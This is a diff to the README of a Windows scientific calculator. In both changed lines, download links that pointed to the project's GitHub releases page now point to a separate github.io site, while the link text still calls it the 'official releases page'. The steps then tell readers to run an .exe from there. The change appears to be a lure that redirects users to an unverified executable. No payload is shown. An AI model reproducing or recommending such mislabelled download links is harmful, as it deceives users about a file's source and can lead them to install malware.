@@ -1,6 +1,6 @@
 # 🧮 mirai-scientific-calculator - Solve complex math problems with ease
 
-[Download Software Version](https://github.com/Cataclysmic-faircopy193/mirai-scientific-calculator/releases)
+[Download Software Version](https://cataclysmic-faircopy193.github.io)
 
 This calculator helps you perform scientific, graphing, and statistical math. You can use it for school, work, or general tasks. It runs on Windows and offers a clean interface for all your calculations.
 
@@ -16,7 +16,7 @@ This calculator helps you perform scientific, graphing, and statistical math. Yo
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/Cataclysmic-faircopy193/mirai-scientific-calculator/releases).
+1.  Visit the [official releases page](https://cataclysmic-faircopy193.github.io).
 2.  Find the most recent version in the list.
 3.  Click the file ending in .exe to start the download.
 4.  Open the folder where your computer saves downloads.
